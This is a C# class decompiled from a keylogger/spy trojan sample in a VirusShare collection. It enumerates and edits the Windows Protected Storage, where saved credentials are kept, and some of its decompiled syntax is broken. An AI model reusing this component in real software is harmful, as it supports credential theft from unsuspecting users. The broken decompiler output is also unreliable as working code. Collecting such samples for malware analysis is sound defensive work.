// Decompiled with JetBrains decompiler
// Type: Roy.CTypes
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Roy.PStoreLib;
using System;
using System.Collections;
using System.Runtime.InteropServices;

namespace Roy
{
  internal class CTypes : CUtils, IEnumerator, IEnumerable
  {
    private IPStore m_IPStore;
    private PST_KEY m_KeyType;
    private IEnumPStoreTypes m_IEnumType;
    private CType_Renamed m_Current;

    internal CTypes(IPStore PStore, PST_KEY KeyType)
    {
      this.m_IPStore = PStore;
      this.m_KeyType = KeyType;
      this.m_IEnumType = PStore.EnumTypes(KeyType, 0);
    }

    public CType_Renamed get_Item(int Index)
    {
      int num1;
      CType_Renamed ctypeRenamed1;
      int num2;
      try
      {
        Guid guid = new Guid();
        ProjectData.ClearProjectError();
        num1 = 2;
        this.m_IEnumType.Reset();
        this.m_IEnumType.Skip(Index);
        int pceltFetched;
        this.m_IEnumType.Next(1, ref guid, ref pceltFetched);
        ctypeRenamed1 = new CType_Renamed();
        ctypeRenamed1.Init(this.m_IPStore, this.m_KeyType, ref guid);
        goto label_6;
label_1:
        num2 = -1;
        switch (num1)
        {
          case 2:
            goto label_6;
        }
      }
      catch (Exception ex) when (
      {
        // ISSUE: unable to correctly present filter
        int num3;
        if (ex is Exception & num1 != 0 & num3 == 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        ProjectData.SetProjectError(ex);
        goto label_1;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_6:
      CType_Renamed ctypeRenamed2 = ctypeRenamed1;
      if (num2 == 0)
        return ctypeRenamed2;
      ProjectData.ClearProjectError();
      return ctypeRenamed2;
    }

    public int Count
    {
      get
      {
        int num1;
        int num2;
        int num3;
        try
        {
          ProjectData.ClearProjectError();
          num1 = 2;
          this.m_IEnumType.Reset();
          while (true)
          {
            this.m_IEnumType.Skip(1);
            checked { ++num2; }
          }
label_2:
          num3 = -1;
          switch (num1)
          {
            case 2:
              goto label_7;
          }
        }
        catch (Exception ex) when (
        {
          int num4;
          if (ex is Exception & num1 != 0 & num4 == 0)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          ProjectData.SetProjectError(ex);
          goto label_2;
        }
        throw ProjectData.CreateProjectError(-2146828237);
label_7:
        int count = num2;
        if (num3 == 0)
          return count;
        ProjectData.ClearProjectError();
        return count;
      }
    }

    public void Delete(Guid guidType) => this.m_IPStore.DeleteType(this.m_KeyType, ref guidType, 0);

    public void Add(Guid guidType, string szDisplayName)
    {
      PST_TYPEINFO pInfo;
      pInfo.cbSize = Strings.Len((object) pInfo);
      pInfo.szDisplayName = Marshal.StringToHGlobalUni(szDisplayName);
      this.m_IPStore.CreateType(this.m_KeyType, ref guidType, ref pInfo, 0);
      Marshal.FreeHGlobal(pInfo.szDisplayName);
    }

    public IEnumerator GetEnumerator()
    {
      this.Reset();
      return (IEnumerator) this;
    }

    public void Reset() => this.m_IEnumType.Reset();

    public object Current => (object) this.m_Current;

    public bool MoveNext()
    {
      Guid guid = new Guid();
      int pceltFetched;
      if (this.m_IEnumType.Next(1, ref guid, ref pceltFetched) != 0)
        return false;
      this.m_Current = new CType_Renamed();
      this.m_Current.Init(this.m_IPStore, this.m_KeyType, ref guid);
      return true;
    }
  }
}
